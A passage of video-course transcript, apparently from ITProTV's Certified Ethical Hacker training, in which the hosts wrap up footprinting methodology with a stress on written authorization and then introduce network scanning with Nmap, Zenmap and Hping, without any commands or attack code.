that.\n\n532\n00:27:24.180 --> 00:27:27.370\nYou may wanna just make sure that\nyou're taking as many steps and\n\n533\n00:27:27.370 --> 00:27:30.330\nas many safeguards to\nheart as you possibly can.\n\n534\n00:27:30.330 --> 00:27:35.060\nCan we go take a look at the Google Alerts\nfeature that we were talking about?\n\n535\n00:27:35.060 --> 00:27:38.720\nI wanna show everybody there,\nand just take a look at this.\n\n536\n00:27:38.720 --> 00:27:41.780\nYou may not be aware of the fact, I think\nMike wasn't aware of this when I mentioned\n\n537\n00:27:41.780 --> 00:27:44.790\nit to him,\nthat Google has an alerting feature.\n\n538\n00:27:44.790 --> 00:27:49.230\nYou just go to google.com/alerts and\nyou could then go in and\n\n539\n00:27:49.230 --> 00:27:52.690\nyou could set up an alert about just\nabout anything that's out there.\n\n540\n00:27:52.690 --> 00:27:56.630\nAnd while in and of itself this is not\na powerful hacking tool, what this does is\n\n541\n00:27:56.630 --> 00:27:59.830\nthis keeps you up-to-date on changes that\nare made to things that are happening\n\n542\n00:27:59.830 --> 00:28:03.930\non a website you want to monitor, or\non some sort of information flow.\n\n543\n00:28:03.930 --> 00:28:08.430\nAnd it will keep, again, the hacker or\nthe ethical hacker alerted and\n\n544\n00:28:08.430 --> 00:28:09.960\nupdated on things that may be changing.\n\n545\n00:28:09.960 --> 00:28:13.490\nMaybe somebody's posted some new\ninformation on their social media feed.\n\n546\n00:28:13.490 --> 00:28:15.230\nMaybe the website has a new entry.\n\n547\n00:28:15.230 --> 00:28:16.940\nAnd there are other\ntools that will do this.\n\n548\n00:28:16.940 --> 00:28:20.070\nWe've taken a look at Wayback Machine and\nthings like that.\n\n549\n00:28:20.070 --> 00:28:21.190\nBut Alerts are pretty cool,\n\n550\n00:28:21.190 --> 00:28:25.920\nbecause what Alerts will do is essentially\ngo out and just simply troll, looking for\n\n551\n00:28:25.920 --> 00:28:28.690\nupdates, and then report on them and\ntell you in a feed what they are.\n\n552\n00:28:29.730 --> 00:28:32.220\nSo it may be valuable for\nyou to take a look at that as well.\n\n553\n00:28:32.220 --> 00:28:34.930\nAnd again, we're just talking about\nlots of different opportunities,\n\n554\n00:28:34.930 --> 00:28:37.230\nlots of different tools,\nlots of different ways for\n\n555\n00:28:37.230 --> 00:28:40.340\nyou to gather this information and\nput it to use, right?\n\n556\n00:28:40.340 --> 00:28:43.390\nSo, just different approaches\nthat may be valuable for you.\n\n557\n00:28:43.390 --> 00:28:44.380\nSo let's talk a little bit,\n\n558\n00:28:44.380 --> 00:28:48.070\nI mentioned I would walk through\nthe footprinting pen testing methodology.\n\n559\n00:28:48.070 --> 00:28:51.740\nI would take the methodology, the ten step\nmethodology, kind of bring it to life for\n\n560\n00:28:51.740 --> 00:28:54.000\nyou, walk through and explain what it is.\n\n561\n00:28:54.000 --> 00:28:58.885\nSo, let's talk about what a common\nflow for the methodology for\n\n562\n00:28:58.885 --> 00:29:01.530\nfootprinting from a pen test\nperspective may look like.\n\n563\n00:29:01.530 --> 00:29:05.040\nIf we were to hit the proverbial Start\nbutton and say okay, let's go and do that,\n\n564\n00:29:05.040 --> 00:29:06.140\nwhat would it look like?\n\n565\n00:29:06.140 --> 00:29:09.960\nWe said we always, without exception,\nunequivocally as an ethical hacker,\n\n566\n00:29:09.960 --> 00:29:12.105\nalways start with getting\nproper authorization.\n\n567\n00:29:12.105 --> 00:29:14.500\nI mentioned several\ntimes in prior episodes,\n\n568\n00:29:14.500 --> 00:29:18.360\nwe have to go seek senior management,\nbuy in, get permission,\n\n569\n00:29:18.360 --> 00:29:22.120\nhave a statement of work and a scoping\ndocument that tells us what will and\n\n570\n00:29:22.120 --> 00:29:25.450\nwill not be acceptable within\nthis particular engagement.\n\n571\n00:29:25.450 --> 00:29:28.190\nIf you don't have that,\nwe don't go to work, it's that simple.\n\n572\n00:29:28.190 --> 00:29:31.820\nI've been asked by customers before,\nhey, can you come in and do this?\n\n573\n00:29:31.820 --> 00:29:34.850\nAbsolutely, we need to go through and\nget this stuff in place.\n\n574\n00:29:34.850 --> 00:29:35.870\nDon't have time for that.\n\n575\n00:29:35.870 --> 00:29:38.440\nSorry, I don't have time to do that for\nyou if you don't have time\n\n576\n00:29:38.440 --> 00:29:41.240\nto make sure that we're doing it\nthe right way, is what I tell customers.\n\n577\n00:29:41.240 --> 00:29:43.271\nAnd I'll respect the fact that\nyou feel you don't have time,\n\n578\n00:29:43.271 --> 00:29:44.220\nI have no trouble with that.\n\n579\n00:29:44.220 --> 00:29:45.711\nBut I have the ability to say no,\n\n580\n00:29:45.711 --> 00:29:48.979\njust like you have the ability to go\ndecide to work with somebody else.\n\n581\n00:29:48.979 --> 00:29:52.417\nAnd you have to understand\nthat as an ethical hacker.\n\n582\n00:29:52.417 --> 00:29:55.924\nYou are not under any obligation\nto do anything, anything for\n\n583\n00:29:55.924 --> 00:29:59.296\nany customer with one exception,\nalways act ethically and\n\n584\n00:29:59.296 --> 00:30:03.479\nalways insure that you have senior\nmanagement or stakeholder buy-in and\n\n585\n00:30:03.479 --> 00:30:07.075\nauthorization to engage in your\nactivities before you start.\n\n586\n00:30:07.075 --> 00:30:09.170\nThat's the only thing\nyou're obligated to do.\n\n587\n00:30:09.170 --> 00:30:12.910\nOther than that, you have the right to say\nno to anybody, under any circumstances,\n\n588\n00:30:12.910 --> 00:30:15.440\nat any time,\njust like everybody else does, right?\n\n589\n00:30:15.440 --> 00:30:16.820\nSo just be aware of that.\n\n590\n00:30:16.820 --> 00:30:18.170\nVery, very important, right?\n\n591\n00:30:18.170 --> 00:30:21.890\nSo think about the fact that we have\nto make sure that the customer,\n\n592\n00:30:21.890 --> 00:30:24.780\nwhoever that is,\nhas given us permission in writing.\n\n593\n00:30:24.780 --> 00:30:26.840\nThis is not a verbal agreement by the way.\n\n594\n00:30:26.840 --> 00:30:29.970\nCuz later on when you get dragged into\na court, you don't wanna play he said,\n\n595\n00:30:29.970 --> 00:30:31.070\nshe said.\n\n596\n00:30:31.070 --> 00:30:32.270\nMike said I could do that.\n\n597\n00:30:32.270 --> 00:30:34.130\nWell Mike, did you said that?\n\n598\n00:30:34.130 --> 00:30:36.908\nJudge, I don't have any\nrecollection of that at all.\n\n599\n00:30:36.908 --> 00:30:38.110\n>> [LAUGH]\n>> I don't even know who Mr.\n\n600\n00:30:38.110 --> 00:30:40.820\nGordon is,\nI've never spoken to him before my life.\n\n601\n00:30:40.820 --> 00:30:43.790\nAs far as I know, he's a hacker\nthat broke into my network and\n\n602\n00:30:43.790 --> 00:30:47.550\ncaused $50,000 in damage, and\nthat's why we're here today, right?\n\n603\n00:30:47.550 --> 00:30:52.030\nBecause Mike doesn't want to admit he made\na mistake and caused this problem, and\n\n604\n00:30:52.030 --> 00:30:53.970\nis now trying to blame me, right?\n\n605\n00:30:53.970 --> 00:30:56.214\nSo if I don't have it in writing, right?\n\n606\n00:30:56.214 --> 00:30:57.382\n[COUGH] We're not gonna do it.\n\n607\n00:30:57.382 --> 00:31:00.220\nI mean, at least for me,\nthat's how I operate.\n\n608\n00:31:00.220 --> 00:31:02.313\nAnd that's how all of you,\nby the way, should operate.\n\n609\n00:31:02.313 --> 00:31:04.180\nYou want to be risk aware, right?\n\n610\n00:31:04.180 --> 00:31:06.440\nAnd we want to be risk adverse, but\n\n611\n00:31:06.440 --> 00:31:08.792\nwe also want to make sure we're doing\nthe right things for the customer.\n\n612\n00:31:08.792 --> 00:31:11.810\nThis protects you and the customer,\nbecause the reality is,\n\n613\n00:31:11.810 --> 00:31:14.660\nif we're protecting the customer\nby having a statement of work and\n\n614\n00:31:14.660 --> 00:31:18.890\na scoping document in place, the customer\nknows exactly what will and won't happen.\n\n615\n00:31:18.890 --> 00:31:21.940\nAnd we're engaging in those activities and\nthey can hold us accountable.\n\n616\n00:31:21.940 --> 00:31:24.790\nHey, Mike, why are you hacking\nthe web server when we talked about\n\n617\n00:31:24.790 --> 00:31:26.450\nnot touching anything on the web?\n\n618\n00:31:26.450 --> 00:31:29.480\nThat's a problem, and that's essentially\nan agreement that we have to\n\n619\n00:31:29.480 --> 00:31:31.793\nmake sure we follow,\nas the well as the customer follow it.\n\n620\n00:31:31.793 --> 00:31:35.412\nIt's essentially like an SLA, it's like a\nservice level agreement that keeps us both\n\n621\n00:31:35.412 --> 00:31:37.162\nhonest about what our expectations are.\n\n622\n00:31:37.162 --> 00:31:38.468\nSo it's very important to have that.\n\n623\n00:31:38.468 --> 00:31:39.924\n>> And the CYA.\n\n624\n00:31:39.924 --> 00:31:41.820\n>> And a CYA, along with an SLA.\n\n625\n00:31:41.820 --> 00:31:44.547\nIt's a CSLYA.\n\n626\n00:31:44.547 --> 00:31:45.484\n>> There we go.\n\n627\n00:31:45.484 --> 00:31:48.955\n>> Cover scope your level ass agreement,\nwhatever, right?\n\n628\n00:31:48.955 --> 00:31:49.541\n>> [LAUGH]\n>> So yes,\n\n629\n00:31:49.541 --> 00:31:54.497\nit is a cover yourself as well as a manage\nyourself expectation setting exercise.\n\n630\n00:31:54.497 --> 00:31:56.710\nSo we're gonna get proper authorization.\n\n631\n00:31:56.710 --> 00:31:58.527\nWe're gonna define the scope\nof the assessment,\n\n632\n00:31:58.527 --> 00:32:00.224\nvery important to be\ndoing that as I've said.\n\n633\n00:32:00.224 --> 00:32:02.470\nWe're then gonna go through and\nstart footprinting.\n\n634\n00:32:02.470 --> 00:32:04.461\nNow remember, we can mix and\nmatch the order.\n\n635\n00:32:04.461 --> 00:32:08.130\nWe talked about a very prescribed,\nspecific set of methodology steps.\n\n636\n00:32:08.130 --> 00:32:09.390\nDo we have the steps on the-\n>> We do.\n\n637\n00:32:09.390 --> 00:32:11.650\n>> Could you just throw them up on\nMike's machine real quick just so\n\n638\n00:32:11.650 --> 00:32:15.690\nI can talk to them while we're actually\ngoing through this and we can see them?\n\n639\n00:32:15.690 --> 00:32:19.740\nSo we typically will start with going\nthrough and footprinting search engines.\n\n640\n00:32:19.740 --> 00:32:21.630\nWe've talked about how we would do that.\n\n641\n00:32:21.630 --> 00:32:25.430\nWe may go in, for instance, and\nuse things like Google, Yahoo!,\n\n642\n00:32:25.430 --> 00:32:28.400\nalthough they may not be around for\nmuch longer, Bing.\n\n643\n00:32:28.400 --> 00:32:30.150\nAny of the search engines, take your pick.\n\n644\n00:32:30.150 --> 00:32:31.770\nThere's a million of them out there,\nright?\n\n645\n00:32:31.770 --> 00:32:34.050\nWe may then go through and\ndo Google hacking.\n\n646\n00:32:34.050 --> 00:32:36.750\nWe talked about using\nthe Google hacking database.\n\n647\n00:32:36.750 --> 00:32:40.160\nThere are other tools like\nSiteDigger that are out there.\n\n648\n00:32:40.160 --> 00:32:42.720\nMetagoofill is another\ntool that you can use.\n\n649\n00:32:42.720 --> 00:32:43.718\nThere's all these different tools.\n\n650\n00:32:43.718 --> 00:32:47.320\nMike talked about the fact that there\nliterally in some cases are 20, 30,\n\n651\n00:32:47.320 --> 00:32:48.970\nor more tools we could use.\n\n652\n00:32:48.970 --> 00:32:51.960\nWe're not gonna list them all,\nbut you get the general idea.\n\n653\n00:32:51.960 --> 00:32:55.050\nWe could perform footprinting\nthrough social networking sites.\n\n654\n00:32:55.050 --> 00:33:00.990\nWe'll go through, hit Facebook, LinkedIn,\nI joked about MySpace, maybe MySpace.\n\n655\n00:33:00.990 --> 00:33:03.000\nCertainly things like Twitter.\n\n656\n00:33:03.000 --> 00:33:05.700\nThere's all these sites out there,\nright, that may be important.\n\n657\n00:33:06.830 --> 00:33:10.970\nWe would talk about performing web\nsite footprinting as we mentioned.\n\n658\n00:33:10.970 --> 00:33:15.230\nGoing in, I showed you how to do\nwebsite mirroring with Httrack.\n\n659\n00:33:15.230 --> 00:33:19.490\nWe talked about in general\njust copying websites down.\n\n660\n00:33:19.490 --> 00:33:23.380\nThere's, BlackWidow is\nanother tool you could use.\n\n661\n00:33:23.380 --> 00:33:25.210\nI love the cool sounding names.\n\n662\n00:33:25.210 --> 00:33:26.655\n>> Yeah.\n>> Nuclear Death, right?\n\n663\n00:33:26.655 --> 00:33:29.585\n>> [LAUGH]\n>> There's just all this great\n\n664\n00:33:29.585 --> 00:33:30.800\nstuff out there.\n\n665\n00:33:30.800 --> 00:33:33.530\nSo website footprinting,\nwe may do email footprinting.\n\n666\n00:33:33.530 --> 00:33:36.430\nI took the time to detour in\nthis episode and show you\n\n667\n00:33:36.430 --> 00:33:39.860\nwhat an email footprinting exercise\nmay look like with host headers and\n\n668\n00:33:39.860 --> 00:33:44.800\nwith one of the sites that we can go out\nand do a lookup on and find information.\n\n669\n00:33:44.800 --> 00:33:47.320\nSo we may go out and\ndo something like that.\n\n670\n00:33:47.320 --> 00:33:50.350\nWe may go out and\ngather competitive intelligence.\n\n671\n00:33:50.350 --> 00:33:54.940\nGo out and search for\ninformation on what companies are doing,\n\n672\n00:33:54.940 --> 00:33:58.040\nwho they're doing that with,\ndo they have strategic agreements and\n\n673\n00:33:58.040 --> 00:34:00.260\nrelationships, things like that.\n\n674\n00:34:00.260 --> 00:34:04.920\nA look through WHOIS and DNS information,\ndo network footprinting.\n\n675\n00:34:04.920 --> 00:34:09.882\nSo we may go out, and on the network,\nwe may use tools that will\n\n676\n00:34:09.882 --> 00:34:14.954\nallow us to able to go in and\nto be able to, you know map out pass.\n\n677\n00:34:14.954 --> 00:34:18.560\nI mentioned VisualRoute as a tool that\ncould be used in combination with\n\n678\n00:34:18.560 --> 00:34:20.975\nemail footprinting to be\nable to find the path.\n\n679\n00:34:20.975 --> 00:34:24.748\nVisualRoute's also a very powerful tool\nfor mapping network topologies and\n\n680\n00:34:24.748 --> 00:34:25.800\ndetailing them out.\n\n681\n00:34:25.800 --> 00:34:29.900\nNETView, you don't underestimate the power\nof something like Visio where you can\n\n682\n00:34:29.900 --> 00:34:31.110\ncreate your own network maps.\n\n683\n00:34:31.110 --> 00:34:34.980\nAnd a lot of times I'll be doing\ndocumentation for clients and\n\n684\n00:34:34.980 --> 00:34:39.500\nI'll create a network map out of Visio and\njust dump all that data in there and\n\n685\n00:34:39.500 --> 00:34:40.420\nshow them what we're doing.\n\n686\n00:34:40.420 --> 00:34:43.450\nSo there's a lot of ways to do\nnetwork footprinting, right.\n\n687\n00:34:43.450 --> 00:34:47.240\nYo, remember through DNS things like\nMS Lookup, we talked about that.\n\n688\n00:34:47.240 --> 00:34:52.780\nWe may go out and use the WHOIS system\nonline, but we may also be able to, if\n\n689\n00:34:52.780 --> 00:34:57.290\nwe are doing this internal to a system, if\nwe are doing pen testing and we're inside.\n\n690\n00:34:57.290 --> 00:35:00.670\nWe wanna get that zone information\nfrom the internal DNS servers.\n\n691\n00:35:00.670 --> 00:35:03.100\nSo we're gonna try to get that and\nthen map all that out.\n\n692\n00:35:03.100 --> 00:35:05.850\nSo it's a combination of where we\nwanna go and what we wanna do.\n\n693\n00:35:05.850 --> 00:35:10.550\nSocial engineering, we talked about\ndumpster diving, throwing stuff away.\n\n694\n00:35:10.550 --> 00:35:13.410\nShoulder surfing's another\nexample of social engineering.\n\n695\n00:35:13.410 --> 00:35:15.180\nLooking over someone's shoulder.\n\n696\n00:35:15.180 --> 00:35:17.210\nSeeing what they're doing from far away or\nnear.\n\n697\n00:35:17.210 --> 00:35:19.280\nI mentioned that in one\nof our earlier episodes.\n\n698\n00:35:19.280 --> 00:35:20.830\nWhat I see on planes.\n\n699\n00:35:20.830 --> 00:35:24.710\nJust the ridiculousness that people\nexpose when they're not even\n\n700\n00:35:24.710 --> 00:35:26.200\nthinking about what they're doing.\n\n701\n00:35:26.200 --> 00:35:28.820\nYou're just eavesdropping, just walking\nby and listening to a conversation.\n\n702\n00:35:28.820 --> 00:35:32.550\nYou're surprised what you can\nlearn if you just sit quietly and\n\n703\n00:35:32.550 --> 00:35:33.880\nlisten to other people talking.\n\n704\n00:35:33.880 --> 00:35:35.855\nI mean the amount of stuff people scream.\n\n705\n00:35:35.855 --> 00:35:38.830\n[CROSSTALK]\n>> And they don't just talk they want to\n\n706\n00:35:38.830 --> 00:35:43.250\nmake sure that everybody in the general\nvicinity hears how cool they are.\n\n707\n00:35:43.250 --> 00:35:47.790\n>> Unbelievable I have to know that you're\nbooking that private jet to fly to Majorca\n\n708\n00:35:47.790 --> 00:35:48.505\ntomorrow.\n\n709\n00:35:48.505 --> 00:35:49.360\n>> [LAUGH]\n>> And\n\n710\n00:35:49.360 --> 00:35:51.660\nyou're hanging out with whoever, right?\n\n711\n00:35:51.660 --> 00:35:53.010\nI really don't need to know, by the way.\n\n712\n00:35:53.010 --> 00:35:55.510\nIt's not gonna make me a better person.\n\n713\n00:35:55.510 --> 00:35:58.005\nIt makes me think less of you,\nwhich is probably accurate,\n\n714\n00:35:58.005 --> 00:35:59.595\nbut I don't need to know that.\n\n715\n00:35:59.595 --> 00:36:00.825\nBut more importantly\n\n716\n00:36:00.825 --> 00:36:02.925\nyou have the reality is you don't\nknow who's standing around you.\n\n717\n00:36:02.925 --> 00:36:06.685\nAnd I'll give you one real world example\nof this by way of wrapping up and\n\n718\n00:36:06.685 --> 00:36:11.012\nfinishing talking about\nthe pen test methodology.\n\n719\n00:36:11.012 --> 00:36:14.472\nAbout a year ago, a year and a half ago,\nI'm standing at a gas station.\n\n720\n00:36:14.472 --> 00:36:17.762\nI'm traveling and I'm somewhere and\nI've got a rental car so\n\n721\n00:36:17.762 --> 00:36:21.362\nI'm filling the rental car up and I'm out\non the west coast of the United States.\n\n722\n00:36:21.362 --> 00:36:24.782\nAnd so, I'm out there, I'm renting a car,\nI'm going to a conference and\n\n723\n00:36:24.782 --> 00:36:25.912\nI'm at the gas pump.\n\n724\n00:36:25.912 --> 00:36:27.482\nI'm just filling up the car.\n\n725\n00:36:27.482 --> 00:36:30.162\nAnd there's a person standing next to\nme on the other side of the island,\n\n726\n00:36:30.162 --> 00:36:32.452\ntypically the pumps are double-sided.\n\n727\n00:36:32.452 --> 00:36:36.420\nAnd this person is out of their car,\nfilling up their car the way I am.\n\n728\n00:36:36.420 --> 00:36:40.200\nThey're on their phone and they're having\na very heated conversation with whoever is\n\n729\n00:36:40.200 --> 00:36:41.540\non the other end of the phone.\n\n730\n00:36:41.540 --> 00:36:44.420\nWhen I say heated,\nI mean they're yelling and screaming.\n\n731\n00:36:44.420 --> 00:36:47.740\nTurns out, and I'm just standing\nthere minding my own business.\n\n732\n00:36:47.740 --> 00:36:50.590\nThe person clearly sees me cuz\nthey're wandering back and\n\n733\n00:36:50.590 --> 00:36:55.360\nforth yelling, gesticulating,\ndoing everything but pumping gas.\n\n734\n00:36:55.360 --> 00:36:58.200\nThey see I'm standing there,\nI'm just minding my own business but\n\n735\n00:36:58.200 --> 00:37:01.920\nthis person's yelling into the phone\nabout how something went wrong with this\n\n736\n00:37:01.920 --> 00:37:05.950\nparticular IFPO that hasn't happened yet\nthat they're getting ready to do.\n\n737\n00:37:05.950 --> 00:37:09.290\nAnd how they have this legal issue and\nthat legal issue and\n\n738\n00:37:09.290 --> 00:37:10.825\nthis person should have done this.\n\n739\n00:37:10.825 --> 00:37:14.860\nAnd when they go live on this date,\nthat this is gonna be a problem.\n\n740\n00:37:14.860 --> 00:37:16.750\nAnd I've got the name of the company-\n>> [LAUGH]\n\n741\n00:37:16.750 --> 00:37:18.560\n>> I understand who this person is,\n\n742\n00:37:18.560 --> 00:37:21.420\ntheir corporate lawyer that\nwas working on this IFPO.\n\n743\n00:37:21.420 --> 00:37:25.790\nSomebody screwed up, this IFPO was not\ngonna be announced publicly, turns out,\n\n744\n00:37:25.790 --> 00:37:27.440\nfor another three or four weeks.\n\n745\n00:37:27.440 --> 00:37:30.690\nSo I find out about all this\ninformation ahead of time.\n\n746\n00:37:30.690 --> 00:37:33.870\nJust because this person is\nstanding there yelling at this,\n\n747\n00:37:33.870 --> 00:37:36.660\nwhoever's on the other end\nof this phone in public.\n\n748\n00:37:36.660 --> 00:37:39.030\nI mean, just not even thinking\ntwice about what they're doing.\n\n749\n00:37:39.030 --> 00:37:41.645\nI mean,\nthis is an FCC violation first of all.\n\n750\n00:37:41.645 --> 00:37:44.368\nThis person could've been charged and\ngone to jail,\n\n751\n00:37:44.368 --> 00:37:48.484\nhad they been done this in different\ncircumstances because you're essentially\n\n752\n00:37:48.484 --> 00:37:50.492\nexposing confidential information.\n\n753\n00:37:50.492 --> 00:37:54.012\nYou could have been accused of insider\ntrading and who knows what else.\n\n754\n00:37:54.012 --> 00:37:56.179\nAnd there would've been\na financial penalty and as I said,\n\n755\n00:37:56.179 --> 00:37:58.734\nthey may have been able actually to\nprove a case against this person for\n\n756\n00:37:58.734 --> 00:38:00.935\ncriminal intent or\nneglect and put them in jail.\n\n757\n00:38:00.935 --> 00:38:03.845\nSo I mean this is not something\nyou just do lightly, yet and\n\n758\n00:38:03.845 --> 00:38:06.865\nI know this person knew better because\nit turns out they're an attorney.\n\n759\n00:38:06.865 --> 00:38:08.957\nSo they clearly should have known better.\n\n760\n00:38:08.957 --> 00:38:09.832\nThey just weren't thinking.\n\n761\n00:38:09.832 --> 00:38:13.427\nAnd I get that, but the reality is\nthere's no excuse for that, right?\n\n762\n00:38:13.427 --> 00:38:15.697\nThat's the exact thing\nhackers take advantage of.\n\n763\n00:38:15.697 --> 00:38:17.827\nThe exact thing they're trying to do.\n\n764\n00:38:17.827 --> 00:38:21.120\nSo we should do all this stuff and then\ndocument our findings as we talked about,\n\n765\n00:38:21.120 --> 00:38:24.850\nmaking sure we understand how to present\nthat information out to everybody.\n\n766\n00:38:24.850 --> 00:38:28.050\nAgain remember this is going to\nsenior leaders, decision makers,\n\n767\n00:38:28.050 --> 00:38:29.530\nstakeholders in the business.\n\n768\n00:38:29.530 --> 00:38:33.170\nWe're ethically hacking, we're hacking for\na purpose, hacking for a reason.\n\n769\n00:38:33.170 --> 00:38:35.680\nNot that unethical hackers don't hack for\na purpose and a reason,\n\n770\n00:38:35.680 --> 00:38:36.700\ncuz they do as well.\n\n771\n00:38:36.700 --> 00:38:40.322\nBut we're doing it obviously for\nthe good, right, on the good side.\n\n772\n00:38:40.322 --> 00:38:42.335\nWe're doing it for\nthe customer that has engaged us,\n\n773\n00:38:42.335 --> 00:38:45.302\nnot because we're looking to gain\nadvantage and take advantage of somebody.\n\n774\n00:38:45.302 --> 00:38:48.954\nSo we just want to remember that as we\nwrap up our conversations in this block of\n\n775\n00:38:48.954 --> 00:38:52.945\nknowledge with these group of episodes\nwe've been engaging in around footprinting\n\n776\n00:38:52.945 --> 00:38:54.032\nand reconnaissance.\n\n777\n00:38:54.032 --> 00:38:56.520\nDon't wanna leave recon out\nbecause we've done a lot of both.\n\n778\n00:38:56.520 --> 00:38:59.694\nBut we wanna make sure we have a sense of\nhow we'd walk through that methodology and\n\n779\n00:38:59.694 --> 00:39:01.150\nwhat it may entail.\n\n780\n00:39:01.150 --> 00:39:03.880\n>> All right, fantastic,\nAdam, we appreciate that.\n\n781\n00:39:03.880 --> 00:39:05.914\nGreat look not only in this episode but\n\n782\n00:39:05.914 --> 00:39:09.868\nprevious episodes where we really took\nan in depth look at footprinting.\n\n783\n00:39:09.868 --> 00:39:12.788\nFrom what it is, how we do it,\nthe tools we use,\n\n784\n00:39:12.788 --> 00:39:16.444\nmethodology, how we can\nincorporate that in pen testing.\n\n785\n00:39:16.444 --> 00:39:20.750\nSo fantastic we appreciate that,\nhope everybody out there enjoyed watching.\n\n786\n00:39:20.750 --> 00:39:23.830\nSigning off for ITProTV, I'm Mike Rodrick.\n\n787\n00:39:23.830 --> 00:39:24.540\n>> I'm Adam Gordon.\n\n788\n00:39:24.540 --> 00:39:26.130\n>>

at ITProTV.\n\n4\n00:00:15.307 --> 00:00:18.991\nI'm your host Mike Rodrick and today\nwe're doing our Certified Ethical Hacker\n\n5\n00:00:18.991 --> 00:00:21.080\nversion9.-\n>> Version9.\n\n6\n00:00:21.080 --> 00:00:22.700\n>> Version9, the latest and\n\n7\n00:00:22.700 --> 00:00:25.158\nthe greatest at the time we\nmade this recording, anyway.\n\n8\n00:00:25.158 --> 00:00:29.880\n[LAUGH] All right and specifically in this\nepisode we're moving on to that next phase\n\n9\n00:00:29.880 --> 00:00:31.570\nof our attack life cycle.\n\n10\n00:00:31.570 --> 00:00:34.640\nAll right, we've talked about\nthe footprinting, the reconnaissance part.\n\n11\n00:00:34.640 --> 00:00:36.200\nNow we're getting into the scanning phase,\n\n12\n00:00:36.200 --> 00:00:39.520\nwhere we start actually\nprobing our targets.\n\n13\n00:00:39.520 --> 00:00:42.890\nMaybe reaching out and touching them and\nlooking for different ways in.\n\n14\n00:00:42.890 --> 00:00:45.210\nAnd here to help us with that is Mr.\nAdam Gordon.\n\n15\n00:00:45.210 --> 00:00:46.090\nHow's it going, Adam?\n\n16\n00:00:46.090 --> 00:00:46.920\n>> Good, good.\n\n17\n00:00:46.920 --> 00:00:48.805\nReaching out and touching and\nprobing, that's a.\n\n18\n00:00:48.805 --> 00:00:50.055\n>> Uh-oh, we're going to get a lawsuit?\n\n19\n00:00:50.055 --> 00:00:50.720\n[LAUGH]\n>> Yeah,\n\n20\n00:00:50.720 --> 00:00:52.380\nthat does sound a little suspicious,\n\n21\n00:00:52.380 --> 00:00:55.330\nhowever we're gonna make that into\nsomething we can take advantage of.\n\n22\n00:00:55.330 --> 00:00:55.930\nNo pun intended.\n>> [LAUGH]\n\n23\n00:00:55.930 --> 00:00:56.910\n>> So\n\n24\n00:00:56.910 --> 00:00:58.660\nwe are gonna talk about network scanning.\n\n25\n00:00:58.660 --> 00:01:01.560\nWe are going to, as Mike said,\ncontinue our discussion around the life\n\n26\n00:01:01.560 --> 00:01:04.240\ncycle we've laid out with\nregards to ethical hacking.\n\n27\n00:01:04.240 --> 00:01:07.370\nWe're gonna talk about what it\nmeans to go out and scan a network.\n\n28\n00:01:07.370 --> 00:01:10.280\nYou know we talk about footprinting,\nwe have in prior episodes talked\n\n29\n00:01:10.280 --> 00:01:13.820\nabout footprinting and reconnaissance,\nand when we do all that background work,\n\n30\n00:01:13.820 --> 00:01:17.540\nwe do all that information gathering,\nwe've then gotta take that and\n\n31\n00:01:17.540 --> 00:01:19.450\ntake that to the next level and\ndo something with it.\n\n32\n00:01:19.450 --> 00:01:23.590\nWhat we're going to talk about is how\nwe anticipate what that information\n\n33\n00:01:23.590 --> 00:01:25.570\nmay tell us and\nthen what direction we will take.\n\n34\n00:01:25.570 --> 00:01:28.854\nHow do we use tools such as Zen Map and\neven Linux or\n\n35\n00:01:28.854 --> 00:01:31.430\nwe'll take a look at in Cali in Linux.\n\n36\n00:01:31.430 --> 00:01:33.720\nWe'll take a look at the port\nto Windows called Zen Map.\n\n37\n00:01:33.720 --> 00:01:36.710\nSo we'll take a look at it in both\nenvironments, essentially the same tool,\n\n38\n00:01:36.710 --> 00:01:37.990\njust a matter of how you use it.\n\n39\n00:01:37.990 --> 00:01:41.370\nWe'll take a look at Hping from the Cali\nLinux suite which will allow us to go out\n\n40\n00:01:41.370 --> 00:01:44.100\nand craft some ping packets,\ndo a variety of things.\n\n41\n00:01:44.100 --> 00:01:49.850\nWe'll talk about and take a look at\ndoing scans and looking for open ports.\n\n42\n00:01:49.850 --> 00:01:52.900\nWe'll see what information we\ncan find in upcoming episodes.\n\n43\n00:01:52.900 --> 00:01:55.480\nI've got a whole slew of things set up\n\n44\n00:01:55.480 --> 00:01:57.740\nin the test environment\nthat we've already done.\n\n45\n00:01:57.740 --> 00:02:00.640\nWe've done an n map scan and\nset it up ahead of time so it runs.\n\n46\n00:02:00.640 --> 00:02:02.540\nTakes some time to do a thorough scan.\n\n47\n00:02:02.540 --> 00:02:06.650\nWe'll go through a profile systems, we'll\ndelve in or rather dig in a little deeper,\n\n48\n00:02:06.650 --> 00:02:07.650\ndelve, and see what we find.\n\n49\n00:02:07.650 --> 00:02:12.210\nBut really the concept of network scanning\nis all about looking for open doors.\n\n50\n00:02:12.210 --> 00:02:16.530\nMike made a reference in his intro to be\nable to see what is there, right, and\n\n51\n00:02:16.530 --> 00:02:19.400\nprobe and push on those doors and\ninteract with things.\n\n52\n00:02:19.400 --> 00:02:21.900\nAnd that's what we're gonna do,\nwe're gonna open the door to the network.\n\n53\n00:02:21.900 --> 00:02:25.530\nNow that we've identified where they are,\nand knock on different doors and\n\n54\n00:02:25.530 --> 00:02:27.120\nsee essentially what happens.\n\n55\n00:02:27.120 --> 00:02:29.500\nWho answers, what we may expect back.\n\n56\n00:02:29.500 --> 00:02:32.650\nAre we gonna get back a response\nthat indicates a Windows machine?\n\n57\n00:02:32.650 --> 00:02:34.630\nAre we gonna get no response back?\n\n58\n00:02:34.630 --> 00:02:37.690\nAre we gonna see something unusual?\n\n59\n00:02:37.690 --> 00:02:41.450\nAre we gonna look for open ports that may\nindicate certain services are running?\n\n60\n00:02:41.450 --> 00:02:45.290\nTell tale signs of operating systems\nbased on common services running.\n\n61\n00:02:45.290 --> 00:02:49.080\nYou know, are we looking for well known\nports, are we looking for dynamic ports\n\n62\n00:02:49.080 --> 00:02:53.050\nthat are assigned on the fly that may\nrepresent a number of different options.\n\n63\n00:02:53.050 --> 00:02:56.040\nThere's all these different though\nprocesses we may engage in,\n\n64\n00:02:56.040 --> 00:02:57.950\nand we're gonna have to\nget educated a little bit.\n\n65\n00:02:57.950 --> 00:03:01.290\nLearn a little bit more about what\nthat information may tell us.\n\n66\n00:03:01.290 --> 00:03:03.570\nOne of the best things we can do,\nis to again,\n\n67\n00:03:03.570 --> 00:03:06.570\nas we talked about in prior discussions\nand other areas, have a plan.\n\n68\n00:03:06.570 --> 00:03:10.340\nHave a thought process,\nallow us to go in, look for, and\n\n69\n00:03:10.340 --> 00:03:13.680\nidentify hosts that may be\ntargets of interest to us.\n\n70\n00:03:13.680 --> 00:03:17.360\nGo through and look at ports 